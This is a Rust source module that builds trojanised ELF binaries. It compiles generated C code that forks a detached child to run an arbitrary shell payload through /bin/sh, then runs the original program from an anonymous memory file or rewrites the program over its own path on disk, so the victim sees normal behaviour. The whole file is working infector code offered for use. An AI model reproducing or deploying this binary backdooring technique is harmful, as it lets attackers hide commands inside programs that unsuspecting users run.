use crate::args;
use crate::codegen::c;
use crate::errors::*;
use serde::{Deserialize, Serialize};
use tokio::fs::File;
use tokio::io::AsyncWrite;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Infect {
    pub payload: String,
    #[serde(default)]
    pub self_replace: bool,
    pub assume_path: Option<String>,
}

impl TryFrom<args::InfectElf> for Infect {
    type Error = Error;

    fn try_from(args: args::InfectElf) -> Result<Self> {
        Ok(Infect {
            payload: args.payload,
            self_replace: args.self_replace,
            assume_path: args.assume_path,
        })
    }
}

pub async fn infect<W: AsyncWrite + Unpin>(
    config: &Infect,
    orig: &[u8],
    out: &mut W,
) -> Result<()> {
    let dir = tempfile::tempdir()?;
    let bin = dir.path().join("bin");

    let mut compiler = c::Compiler::spawn(&bin).await?;

    info!("Generating source code...");
    let mut buf = String::new();
    c::escape(config.payload.as_bytes(), &mut buf)?;
    compiler
        .add_lines(&[
            "#define _GNU_SOURCE\n",
            "#include <stdio.h>\n",
            "#include <stdlib.h>\n",
            "#include <unistd.h>\n",
            "#include <fcntl.h>\n",
            "#include <sys/mman.h>\n",
            "#include <linux/limits.h>\n",
            "int main(int argc, char** argv) {\n",
            "pid_t c = fork();\n",
            "if (c) goto bin;\n",
            "setsid();\n",
            &format!("char *args[]={{\"/bin/sh\", \"-c\", \"{}\", NULL}};\n", buf),
            "execve(\"/bin/sh\", args, environ);\n",
            "exit(0);\n",
            "bin:\n",
        ])
        .await?;

    if config.self_replace {
        if let Some(assume_path) = &config.assume_path {
            buf.clear();
            c::escape(assume_path.as_bytes(), &mut buf)?;
            compiler
                .add_line(&format!("char *p=\"{}\";\n", buf))
                .await?;
        } else {
            compiler
                .add_lines(&[
                    "char p[PATH_MAX+1];\n",
                    "ssize_t n = readlink(\"/proc/self/exe\", p, sizeof(p)-1);\n",
                    "p[n]=0;\n",
                ])
                .await?;
        }
        compiler
            .add_lines(&[
                "unlink(p);\n",
                "int f = open(p, O_CREAT | O_TRUNC | O_WRONLY, 0755);\n",
            ])
            .await?;
        c::stream_bin(orig, &mut compiler.stdin).await?;
        compiler
            .add_lines(&[
                "close(f);\n",
                "execve(p, argv, environ);\n",
                "exit(1);\n",
                "}\n",
            ])
            .await?;
    } else {
        compiler
            .add_line("int f = memfd_create(\"\", MFD_CLOEXEC);\n")
            .await?;
        c::stream_bin(orig, &mut compiler.stdin).await?;
        compiler
            .add_lines(&["fexecve(f, argv, environ);\n", "exit(1);\n", "}\n"])
            .await?;
    }

    let mut pending = compiler.done();
    info!("Waiting for compile to finish...");
    pending.wait().await?;

    debug!("Copying compiled binary to final destination");
    let mut f = File::open(&bin)
        .await
        .with_context(|| anyhow!("Failed to open compiled binary at {:?}", bin))?;
    tokio::io::copy(&mut f, out).await?;

    info!("Successfully generated binary");

    Ok(())
}
